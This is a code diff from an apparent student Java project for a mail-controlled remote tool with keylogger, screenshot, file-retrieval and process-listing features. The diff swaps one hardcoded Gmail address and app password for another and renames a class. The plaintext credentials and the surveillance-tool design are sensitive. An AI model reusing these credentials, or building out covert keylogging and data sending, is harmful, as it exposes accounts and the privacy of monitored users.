@@ -2,18 +2,17 @@ package com.example.project.server;
 
 import com.example.project.features.getfile.GetFile;
 import com.example.project.features.keylogger.KeyLog;
-import com.example.project.features.listApp.ListApp;
+import com.example.project.features.list.ListPrc;
 import com.example.project.features.power.SRS;
 import com.example.project.features.screenshot.Screenshot;
 import com.example.project.mail.sendMail;
 
 import java.io.File;
 import java.io.IOException;
-import java.util.ArrayList;
 
 public class sendResponse extends Thread{
-    final String DEFAULT_MAIL = "dangtanphat9a1@gmail.com";
-    final String DEFAULT_PASSWORD = "mylxemednkcccfzz";
+    final String DEFAULT_MAIL = "projectmangmaytinh2004@gmail.com";
+    final String DEFAULT_PASSWORD = "gorabwfzyfuqfkgy";
     boolean isKeylogTurnOn = false;
     String keylogText = "";
     int index = 0;
@@ -46,7 +45,7 @@ public class sendResponse extends Thread{
                 }
                 //list app
                 case '3': {
-                    ListApp la = new ListApp();
+                    ListPrc la = new ListPrc();
                     File file;
                     try {
                         file = la.run();
